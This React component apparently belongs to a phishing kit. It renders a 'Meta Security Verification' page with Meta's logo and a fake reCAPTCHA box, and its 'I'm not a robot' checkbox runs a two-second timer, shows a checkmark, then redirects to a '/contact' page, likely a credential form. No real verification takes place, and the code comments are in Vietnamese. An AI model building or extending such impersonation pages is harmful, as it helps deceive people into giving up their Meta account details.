import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-image.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import axios from 'axios';
import { useNavigate } from 'react-router-dom'; // SỬA THÀNH REACT ROUTER
import { useEffect, useState } from 'react';

const Index = () => {
    const navigate = useNavigate(); // SỬA THÀNH REACT ROUTER
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setIsShowCheckMark] = useState(false);

    const handleVerify = async () => {
        setIsLoading(true);
        try {
            setTimeout(() => {
                setIsShowCheckMark(true);
                setIsLoading(false);
            }, 2000);
        } catch {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if (isShowCheckMark) {
            const redirectTimeOut = setTimeout(() => {
                navigate('/contact'); // SỬA THÀNH REACT ROUTER
            }, 1000);
            return () => {
                clearTimeout(redirectTimeOut);
            };
        }
    }, [isShowCheckMark, navigate]);

    return (
        <div className="flex min-h-screen items-center justify-center bg-white">
            <title>Meta Security Verification</title>
            <div className="w-full max-w-md p-6">
                {/* Meta Logo */}
                <div className="mb-6">
                    <img src={MetaImage} alt="Meta" className="h-12 w-auto" /> {/* SỬA THÀNH img */}
                </div>

                {/* Recaptcha Box */}
                <div className="mb-6 rounded-lg border border-gray-300 bg-gray-50 p-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-3">
                            <button
                                onClick={handleVerify}
                                disabled={isLoading || isShowCheckMark}
                                className="flex h-8 w-8 items-center justify-center rounded border-2 border-gray-400 bg-white focus:outline-none"
                            >
                                {isLoading ? (
                                    <div className="h-5 w-5 animate-spin rounded-full border-2 border-blue-500 border-t-transparent"></div>
                                ) : isShowCheckMark ? (
                                    <img src={CheckMarkImage} alt="Verified" className="h-5 w-5" /> {/* SỬA THÀNH img */}
                                ) : (
                                    <div className="h-5 w-5"></div>
                                )}
                            </button>
                            <span className="text-sm font-medium text-gray-700">
                                I'm not a robot
                            </span>
                        </div>
                        
                        <div className="flex flex-col items-center">
                            <img src={ReCaptchaImage} alt="reCAPTCHA" className="h-8 w-8" /> {/* SỬA THÀNH img */}
                            <span className="text-xs font-bold text-gray-600">reCAPTCHA</span>
                            <span className="text-[10px] text-gray-500">Privacy - Terms</span>
                        </div>
                    </div>
                </div>

                {/* ... giữ nguyên phần còn lại */}
            </div>
        </div>
    );
};

export default Index;
